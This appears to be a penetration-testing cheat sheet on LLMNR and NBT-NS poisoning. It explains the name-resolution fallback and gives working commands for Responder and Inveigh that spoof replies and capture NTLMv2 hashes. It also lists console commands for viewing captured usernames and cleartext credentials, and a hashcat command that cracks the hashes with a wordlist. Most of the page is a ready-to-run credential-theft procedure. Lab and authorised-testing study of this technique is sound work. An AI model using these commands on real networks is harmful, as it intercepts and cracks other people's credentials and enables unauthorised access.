# LLMNR, NBT-NS Poisoning

## <mark style="color:yellow;">ABOUT</mark>

Imagine a situation: you need to connect to some local domain, website, or SMB share. You misclicked one letter and instead of some <mark style="color:blue;">**`\\mil-stash`**</mark> share you wrote <mark style="color:blue;">**`\\mel-stash`**</mark> and first request goes to DNS server, but it doesn't know who the hell is <mark style="color:blue;">**`\\mel-stash`**</mark>, so it sending a broadcast request (works same as ARP, just where ARP connects MAC to IP, LMMNR connects names to IP's). And that's the place where we come in with Responder (UNIX) or Inveigh (Windows) to poison these requests and to make target think that our IP is the right one. It tries to authenticate and sends hash which we can crack with <mark style="color:green;">**Hashcat.**</mark>&#x20;

## <mark style="color:yellow;">RESPONDER</mark>

<mark style="color:orange;">**MOSTLY LINUX TOOL (BUT THERE IS WIN VERSION)**</mark>

### <mark style="color:blue;">Overview</mark>

<mark style="color:red;">**Responder**</mark> is a <mark style="color:purple;">**powerful tool**</mark> used for **LLMNR/NBT-NS poisoning**, capable of capturing NTLMv1/NTLMv2 hashes from network traffic. It can operate in both <mark style="color:yellow;">**Analysis (passive) mode**</mark> and <mark style="color:yellow;">**Poisoning (active) mode**</mark><mark style="color:yellow;">.</mark>

### <mark style="color:blue;">Running Responder</mark>

To display available options, use:

```bash
responder -h
```

To start Responder with default settings:

```bash
sudo responder -I ens451
```

### <mark style="color:blue;">Common Flags</mark>

* <mark style="color:green;">**`-A`**</mark> : Analyze mode (passive monitoring without responding)
* <mark style="color:green;">**`-I <interface>`**</mark> : Specify network interface
* <mark style="color:green;">**`-w`**</mark> : Start WPAD rogue proxy server

### <mark style="color:blue;">Capturing Hashes</mark>

Responder listens for authentication requests and captures NTLM hashes when a target attempts to authenticate. <mark style="color:yellow;">**These hashes are saved in:**</mark>

```bash
/usr/share/responder/logs
```

Hashes are stored in the format:

```bash
(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
```

Example captured log files:

```bash
SMB-NTLMv2-SSP-13.13.13.13.txt
HTTP-NTLMv2-13.13.13.13.txt
```

### <mark style="color:blue;">Cracking NTLMv2 Hashes with Hashcat</mark>

```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

## <mark style="color:yellow;">INVEIGH</mark>

<mark style="color:orange;">**WINDOWS TOOL**</mark>

### <mark style="color:blue;">Overview</mark>

<mark style="color:red;">**Inveigh**</mark> is a <mark style="color:purple;">**PowerShell/C# tool**</mark> similar to Responder, used for LLMNR, NBNS, and SMB relay attacks on Windows networks.

### <mark style="color:blue;">Running Inveigh (PowerShell Version)</mark>

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

**Key Features:**

* Captures NTLM hashes via LLMNR/NBT-NS spoofing
* Supports multiple protocols (DNS, mDNS, SMB, HTTP, LDAP, WebDAV)
* Can output logs to a file (<mark style="color:green;">**`C:\Tools`**</mark> directory)

### <mark style="color:blue;">Running Inveigh (C# Version)</mark>

The C# version (<mark style="color:green;">**`Inveigh.exe`**</mark>) is more stable and is the recommended option.

```powershell
.\Inveigh.exe
```

**Default enabled options:**

* LLMNR & NBNS Spoofing
* HTTP/HTTPS Authentication Capture (NTLM)
* SMB & LDAP Listening

### <mark style="color:blue;">Interacting with Inveigh</mark>

> While running Inveigh, press **ESC** to open the interactive console.

**Useful Commands:**

```powershell
GET NTLMV2UNIQUE     # Display unique NTLMv2 hashes
GET NTLMV2USERNAMES  # Display captured usernames and IPs
GET CLEARTEXT        # Display captured cleartext credentials
STOP                 # Stop Inveigh
```

## <mark style="color:blue;">Cracking NTLMv2 Hashes with Hashcat</mark>

```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```
